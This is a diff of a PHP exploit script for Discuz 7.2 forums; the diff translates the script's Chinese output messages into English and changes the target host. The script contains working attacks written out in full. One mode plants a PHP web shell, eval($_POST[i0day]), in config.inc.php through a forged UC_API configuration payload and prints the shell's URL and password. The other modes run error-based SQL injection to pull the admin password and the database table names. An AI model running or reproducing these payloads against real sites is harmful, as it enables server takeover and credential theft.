@@ -12,7 +12,7 @@ $host=$argv[1];
 $path=$argv[2];
 $js=$argv[3];
 $timestamp = time()+10*3600;
-$table="cdb_";//表名
+$table="cdb_";//table
 
 if ($argc < 2) {
     print_r('
@@ -21,7 +21,7 @@ if ($argc < 2) {
   *  ---------By：Www.i0day.com-----------               * 
   *     Usage: php '.$argv[0].' url [js]                    *
   *  -------------------------------------               *
-  *  js选项: 1.GetShell 2.取密码 3.查表前缀              *
+  *  jsoption: 1.GetShell 2.get pwd 3.get the table prefix  *
   *                                                      *
   *   php '.$argv[0].' Www.i0day.com / 1                    *
   *   php '.$argv[0].' Www.i0day.com /dz72/ 1               *
@@ -36,10 +36,10 @@ if($js==1){
     $resp = sendpack($host,$path,$sql);
     
     if(strpos($resp,"::")==-1){
-        echo '表前缀可能不是默认cdb_ 请先查看表前缀！';
+        echo 'the default table should not cdb_ please check the table!\n';
     }else{
     preg_match("/::(.*)::/",$resp,$matches);
-	echo 'the matches is $matches[1]' ;
+	echo "the matches is $matches[1]" ;
     $lenght=intval($matches[1]);
     if($lenght){
         if($lenght<=124){
@@ -54,21 +54,21 @@ if($js==1){
             $code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $key));
             $cmd1='<?xml version="1.0" encoding="ISO-8859-1"?>
 <root>
- <item id="UC_API">bbs.49you.com\');eval($_POST[i0day]);//</item>
+ <item id="UC_API">http://192.168.2.38/discuz_7.2/uc_server\');eval($_POST[i0day]);//</item>
 </root>';
             $cmd2='<?xml version="1.0" encoding="ISO-8859-1"?>
 <root>
- <item id="UC_API">bbs.49you.com</item>
+ <item id="UC_API">http://192.168.2.38/discuz_7.2/uc_server</item>
 </root>';
             $html1 = send($cmd1);
             $res1=substr($html1,-1);
             $html2 = send($cmd2);
             $res2=substr($html1,-1);
             if($res1=='1'&&$res2=='1'){
-            echo "shell地址：http://".$host.$path.'config.inc.php   pass:i0day';
+            echo "shell url:http://".$host.$path.'config.inc.php   pass:i0day'."\n";
             }
             }else{
-                echo '获取失败';
+                echo 'get fail';
             }
         }
     }
@@ -79,9 +79,9 @@ if($js==1){
     $resp = sendpack($host,$path,$sql);
     if(strpos($resp,"\^\^\^")!=-1){
         preg_match("/\^\^\^(.*)\^/U",$resp,$password);
-        echo '密码：'.$password[1];
+        echo 'passwd:'.$password[1]."\n";
         }else{
-            echo '表前缀可能不是默认cdb_ 请先查看表前缀！';
+            echo 'the default table prefix should not cdb_ please check the table prefix!\n';
         }
 }elseif($js==3){
     $sql="action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x5E,(select%20hex(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1),0x5E)x%20from%20information_schema%20.tables%20group%20by%20x)a)%23";
@@ -90,15 +90,15 @@ if($js==1){
         preg_match("/1\^(.*)\^/U",$resp,$t);
         
         if(strpos($t[1],"cdb_")!=-1){
-            echo "表名为：".hex2str($t[1])." 表前缀为默认cdb_ 无需修改";
+            echo "table:".hex2str($t[1])." the table is default cdb_ don't change table\n";
         }else{
-            echo "表名：".hex2str($t[1]).' 不是默认表名cdb_请自行修改代码中的$table';
+            echo "table:".hex2str($t[1]).' not the default table cdb_please change the code $table\n';
         }
     }else{
-        echo "查看表前缀失败,Sorry";
+        echo "check the table prefix fail,Sorry\n";
     }
 }else{
-    echo "未选择脚本功能";
+    echo "don't choose any function\n";
 }
 
 
